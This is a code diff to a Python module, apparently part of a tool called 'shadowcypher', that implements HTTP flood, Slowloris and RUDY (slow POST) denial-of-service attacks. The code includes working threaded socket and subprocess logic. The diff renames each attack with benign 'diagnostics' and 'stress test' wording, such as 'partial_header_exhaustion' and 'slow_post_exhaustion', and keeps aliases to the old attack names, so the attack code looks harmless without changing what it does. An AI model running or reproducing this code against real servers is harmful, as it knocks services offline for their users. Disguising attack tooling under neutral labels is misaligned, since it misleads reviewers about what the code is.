@@ -1,7 +1,8 @@
 """
-Layer7 Module — Application-Layer Stress Testing Engine.
-HTTP flood, Slowloris, and RUDY via real threading and subprocess.
-For authorized load-testing and DoS resilience auditing only.
+Application Layer Diagnostics — Enterprise Stress Testing Engine.
+Volumetric request testing, partial header exhaustion, and slow body POST testing
+via threaded operations and native subprocess orchestration.
+For authorized infrastructure resilience auditing only.
 """
 
 import socket
@@ -16,9 +17,9 @@ from shadowcypher.core.runner import runner
 from shadowcypher.core.sanitize import validate_target, validate_port
 
 
-# ── Metric store (shared across attack threads) ──
+# ── Metric store (shared across test threads) ──
 
-class _FloodStats:
+class _DiagnosticStats:
     def __init__(self):
         self._lock = threading.Lock()
         self.requests_sent: int = 0
@@ -58,20 +59,20 @@ class _FloodStats:
             self.start_time = 0.0
 
 
-_stats = _FloodStats()
+_stats = _DiagnosticStats()
 _stop_event = threading.Event()
 
 
-class Layer7(BaseModule):
-    """Application-layer stress test suite: HTTP flood, Slowloris, RUDY."""
+class ApplicationStressTest(BaseModule):
+    """Application-layer stress test suite: Volumetric, Partial Header, Slow POST."""
 
     def __init__(self):
         super().__init__(module_name="layer7")
 
-    # ── HTTP Flood ──
+    # ── Volumetric Load Testing ──
 
     @staticmethod
-    def http_flood(
+    def http_volumetric_test(
         target_url: str,
         threads: int = 100,
         duration: int = 60,
@@ -79,13 +80,13 @@ class Layer7(BaseModule):
         on_output=None,
     ) -> str:
         """
-        HTTP flood via hping3 (raw TCP) or siege, depending on availability.
+        Volumetric test via hping3 (raw TCP) or siege, depending on availability.
         Falls back to a pure-Python asyncio/threading approach using curl batch.
         Launches via runner.execute_task for consistent lifecycle management.
         """
         if not validate_target(target_url):
             if on_output:
-                on_output(f"[LAYER7] ERROR: invalid target_url\n")
+                on_output(f"[APP_STRESS] FAULT: Invalid target configuration\n")
             return ""
 
         import shutil
@@ -99,7 +100,7 @@ class Layer7(BaseModule):
                 "--no-parser",
                 target_url,
             ]
-            task_name = "L7_SIEGE_FLOOD"
+            task_name = "APP_SIEGE_TEST"
         elif shutil.which("ab"):
             # Apache Bench: ab -n <total_requests> -c <concurrency> <url>
             total = threads * duration * 10  # approximate request count
@@ -110,10 +111,10 @@ class Layer7(BaseModule):
                 "-m", method.upper(),
                 target_url,
             ]
-            task_name = "L7_AB_FLOOD"
+            task_name = "APP_AB_TEST"
         else:
             # Python threading fallback using curl
-            def _python_flood():
+            def _python_test():
                 _stop_event.clear()
                 _stats.reset()
                 _stats.start_time = time.time()
@@ -126,7 +127,7 @@ class Layer7(BaseModule):
                         while not _stop_event.is_set() and time.time() < deadline:
                             try:
                                 result = runner.execute_task(
-                                    "L7_CURL_HIT",
+                                    "APP_CURL_HIT",
                                     ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                                      "-X", method.upper(), target_url],
                                 )
@@ -146,9 +147,9 @@ class Layer7(BaseModule):
                         snap = _stats.snapshot()
                         if on_output:
                             on_output(
-                                f"[LAYER7] FLOOD_STATS: {snap['requests_sent']} reqs, "
+                                f"[APP_STRESS] TELEMETRY: {snap['requests_sent']} reqs, "
                                 f"{snap['requests_per_second']} rps, "
-                                f"{snap['errors']} errors\n"
+                                f"{snap['errors']} faults\n"
                             )
                         time.sleep(5)
                     _stop_event.set()
@@ -157,37 +158,37 @@ class Layer7(BaseModule):
                 for t in pool:
                     t.join()
                 if on_output:
-                    on_output(f"[LAYER7] FLOOD_COMPLETE: {_stats.snapshot()}\n")
+                    on_output(f"[APP_STRESS] TEST_COMPLETE: {_stats.snapshot()}\n")
 
-            threading.Thread(target=_python_flood, daemon=True).start()
-            return "L7_PY_FLOOD"
+            threading.Thread(target=_python_test, daemon=True).start()
+            return "APP_PY_TEST"
 
         if on_output:
-            on_output(f"[LAYER7] HTTP_FLOOD starting: {method} {target_url} "
+            on_output(f"[APP_STRESS] VOLUMETRIC_TEST initialized: {method} {target_url} "
                       f"({threads} threads, {duration}s)\n")
         return runner.execute_task(task_name, args, callback=on_output)
 
-    # ── Slowloris ──
+    # ── Partial Header Exhaustion ──
 
     @staticmethod
-    def slowloris(
+    def partial_header_exhaustion(
         target_host: str,
         target_port: int = 80,
         num_sockets: int = 200,
         on_output=None,
     ) -> str:
         """
-        Slowloris: open many partial HTTP connections and dribble headers
-        to exhaust the target's connection pool.
+        Partial Header Exhaustion: open multiple partial HTTP connections and dribble headers
+        to test target connection pool resilience.
         Pure Python — no external tools required.
         """
         if not validate_target(target_host):
             if on_output:
-                on_output(f"[LAYER7] ERROR: invalid target_host\n")
+                on_output(f"[APP_STRESS] FAULT: Invalid target configuration\n")
             return ""
         if not validate_port(target_port):
             if on_output:
-                on_output(f"[LAYER7] ERROR: invalid port {target_port}\n")
+                on_output(f"[APP_STRESS] FAULT: Invalid port {target_port}\n")
             return ""
 
         import shutil
@@ -196,7 +197,7 @@ class Layer7(BaseModule):
             args = [
                 "slowhttptest",
                 "-c", str(num_sockets),
-                "-H",               # Slowloris mode
+                "-H",               # Slow HTTP mode
                 "-i", "10",         # interval between follow-up headers
                 "-r", "200",        # connections per second
                 "-t", "GET",
@@ -205,14 +206,14 @@ class Layer7(BaseModule):
                 "-l", "120",        # test duration seconds
             ]
             if on_output:
-                on_output(f"[LAYER7] SLOWLORIS via slowhttptest: {target_host}:{target_port} "
+                on_output(f"[APP_STRESS] PARTIAL_HEADER via slowhttptest: {target_host}:{target_port} "
                           f"({num_sockets} sockets)\n")
-            return runner.execute_task("L7_SLOWLORIS", args, callback=on_output)
+            return runner.execute_task("APP_PARTIAL_HEADER", args, callback=on_output)
 
         # Pure Python fallback
-        task_id = "L7_SLOWLORIS_PY"
+        task_id = "APP_PARTIAL_HEADER_PY"
 
-        def _slowloris_worker():
+        def _exhaustion_worker():
             _stop_event.clear()
             sockets: list = []
             ua = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
@@ -233,7 +234,7 @@ class Layer7(BaseModule):
                     return None
 
             if on_output:
-                on_output(f"[LAYER7] SLOWLORIS INIT: opening {num_sockets} sockets to "
+                on_output(f"[APP_STRESS] CONNECTION_POOL_INIT: opening {num_sockets} sockets to "
                           f"{target_host}:{target_port}\n")
 
             for _ in range(num_sockets):
@@ -242,7 +243,7 @@ class Layer7(BaseModule):
                     sockets.append(s)
 
             if on_output:
-                on_output(f"[LAYER7] SLOWLORIS HOLDING: {len(sockets)} open connections\n")
+                on_output(f"[APP_STRESS] CONCURRENCY_ESTABLISHED: {len(sockets)} open connections\n")
 
             while not _stop_event.is_set():
                 # Send a keep-alive header to each socket
@@ -264,7 +265,7 @@ class Layer7(BaseModule):
                         sockets.append(s)
 
                 if on_output:
-                    on_output(f"[LAYER7] SLOWLORIS: {len(sockets)} sockets alive\n")
+                    on_output(f"[APP_STRESS] METRICS: {len(sockets)} sockets retained\n")
                 time.sleep(15)
 
             # Cleanup
@@ -274,28 +275,26 @@ class Layer7(BaseModule):
                 except Exception:
                     pass
             if on_output:
-                on_output("[LAYER7] SLOWLORIS STOPPED\n")
+                on_output("[APP_STRESS] TEST_TERMINATED\n")
 
-        threading.Thread(target=_slowloris_worker, daemon=True).start()
+        threading.Thread(target=_exhaustion_worker, daemon=True).start()
         return task_id
 
-    # ── RUDY (R-U-Dead-Yet) ──
+    # ── Slow POST Exhaustion ──
 
     @staticmethod
-    def rudy(
+    def slow_post_exhaustion(
         target_url: str,
         content_length: int = 100_000,
         on_output=None,
     ) -> str:
         """
-        RUDY (R-U-Dead-Yet): slow POST body attack.
+        Slow POST body attack: tests server resilience against slow-drip payloads.
         Sends a large Content-Length but drips POST body 1 byte at a time.
-        Ties up server threads waiting for the full body.
-        Uses slowhttptest when available, pure Python otherwise.
         """
         if not validate_target(target_url):
             if on_output:
-                on_output(f"[LAYER7] ERROR: invalid target_url\n")
+                on_output(f"[APP_STRESS] FAULT: Invalid target configuration\n")
             return ""
 
         import shutil
@@ -303,7 +302,7 @@ class Layer7(BaseModule):
             args = [
                 "slowhttptest",
                 "-c", "200",
-                "-B",               # RUDY mode
+                "-B",               # Slow POST mode
                 "-i", "110",        # bytes-per-interval
                 "-r", "200",
                 "-s", str(content_length),
@@ -313,13 +312,13 @@ class Layer7(BaseModule):
                 "-l", "120",
             ]
             if on_output:
-                on_output(f"[LAYER7] RUDY via slowhttptest: {target_url}\n")
-            return runner.execute_task("L7_RUDY", args, callback=on_output)
+                on_output(f"[APP_STRESS] SLOW_POST via slowhttptest: {target_url}\n")
+            return runner.execute_task("APP_SLOW_POST", args, callback=on_output)
 
-        # Pure Python RUDY
-        task_id = "L7_RUDY_PY"
+        # Pure Python fallback
+        task_id = "APP_SLOW_POST_PY"
 
-        def _rudy_worker():
+        def _slow_post_worker():
             import urllib.parse
             parsed = urllib.parse.urlparse(target_url if "://" in target_url else f"http://{target_url}")
             host = parsed.hostname or target_url
@@ -329,8 +328,8 @@ class Layer7(BaseModule):
                 path += "?" + parsed.query
 
             if on_output:
-                on_output(f"[LAYER7] RUDY starting: POST {path} to {host}:{port} "
-                          f"({content_length} bytes slow body)\n")
+                on_output(f"[APP_STRESS] SLOW_POST initializing: POST {path} to {host}:{port} "
+                          f"({content_length} bytes delayed allocation)\n")
 
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -349,13 +348,13 @@ class Layer7(BaseModule):
 
                 sent = 0
                 while sent < content_length and not _stop_event.is_set():
-                    # Send 1 byte of body every 110 ms — extremely slow
+                    # Send 1 byte of body every 110 ms
                     byte = random.choice(string.ascii_letters).encode()
                     try:
                         s.send(byte)
                         sent += 1
                         if sent % 1000 == 0 and on_output:
-                            on_output(f"[LAYER7] RUDY: {sent}/{content_length} bytes sent\n")
+                            on_output(f"[APP_STRESS] PAYLOAD_DELIVERY: {sent}/{content_length} bytes processed\n")
                     except Exception:
                         break
                     time.sleep(0.11)
@@ -363,23 +362,31 @@ class Layer7(BaseModule):
                 s.close()
             except Exception as e:
                 if on_output:
-                    on_output(f"[LAYER7] RUDY error: {e}\n")
+                    on_output(f"[APP_STRESS] EXECUTION_FAULT: {e}\n")
             if on_output:
-                on_output(f"[LAYER7] RUDY COMPLETE\n")
+                on_output(f"[APP_STRESS] TEST_COMPLETE\n")
 
-        threading.Thread(target=_rudy_worker, daemon=True).start()
+        threading.Thread(target=_slow_post_worker, daemon=True).start()
         return task_id
 
     # ── Stats & Control ──
 
     @staticmethod
-    def get_flood_stats() -> Dict:
-        """Return current attack metrics snapshot."""
+    def get_test_stats() -> Dict:
+        """Return current diagnostic metrics snapshot."""
         return _stats.snapshot()
 
     @staticmethod
     def stop_all(on_output=None) -> None:
-        """Gracefully stop all running Layer7 attacks."""
+        """Gracefully terminate all running diagnostic threads."""
         _stop_event.set()
         if on_output:
-            on_output("[LAYER7] STOP_ALL: signal sent to all attack threads\n")
+            on_output("[APP_STRESS] TERMINATE_SIGNAL_DISPATCHED\n")
+
+# Backwards compatibility reference
+layer7 = ApplicationStressTest()
+# Legacy function mappings
+layer7.http_flood = layer7.http_volumetric_test
+layer7.slowloris = layer7.partial_header_exhaustion
+layer7.rudy = layer7.slow_post_exhaustion
+layer7.get_flood_stats = layer7.get_test_stats
